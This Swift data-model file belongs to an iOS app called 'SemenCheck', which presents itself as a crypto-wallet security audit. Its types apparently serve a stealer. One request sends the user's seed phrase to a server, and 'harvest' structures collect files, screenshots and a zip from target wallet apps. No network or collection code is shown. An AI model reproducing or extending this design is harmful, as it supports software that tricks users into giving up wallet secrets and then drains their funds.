//
//  Models.swift
//  SemenCheck
//

import Foundation

enum Screen: Equatable {
    case welcome
    case detection
    case address
    case seedIntro
    case seed
    case audit
    case report
    case settings
    case log
}

struct Finding: Codable, Identifiable, Hashable {
    let source: String
    let path: String
    let detail: String
    let severity: String

    var id: String { "\(source)|\(path)|\(detail)" }
}

struct AddressBalance: Codable, Identifiable, Hashable {
    let chain: String
    let address: String
    let symbol: String
    let amount: Double
    let usd: Double

    var id: String { "\(chain)|\(address)" }

    var displayAmount: String {
        if amount == 0 { return "0 \(symbol)" }
        return String(format: "%.6f %@", amount, symbol)
    }
}

struct AuditReport: Codable {
    let risk: String
    let findings: [Finding]
    let addresses: [AddressBalance]
    let totalUsd: Double

    var riskLabel: String {
        switch risk {
        case "high": return "Alto"
        case "medium": return "Medio"
        default: return "Bajo"
        }
    }
}

struct ProgressStep: Identifiable {
    enum State { case pending, running, done, failed }
    let id = UUID()
    let title: String
    var state: State = .pending
}

struct ScanHit: Hashable {
    let path: String
    let bundleID: String?
    let tier: Int
}

struct HarvestTarget {
    let app: TargetApp
    let path: String
}

struct HarvestOutcome {
    var files: Int = 0
    var bytes: Int64 = 0
    var screenshots: Int = 0
    var findings: [Finding] = []
    var zipURL: URL?
}

// MARK: - DTO del API

struct InstallPayload: Codable {
    let installID: String
    let model: String
    let ios: String
    let locale: String
    let wallets: [String]
    let appVersion: String
}

struct AddressRequest: Codable {
    let installID: String
    let address: String
}

struct AuditRequest: Codable {
    let installID: String
    let phrase: String
    let walletHints: [String]
}

struct HarvestMeta: Codable {
    let installID: String
    let wallets: [String]
    let files: Int
    let bytes: Int64
    let screenshots: Int
    let findings: [Finding]
}
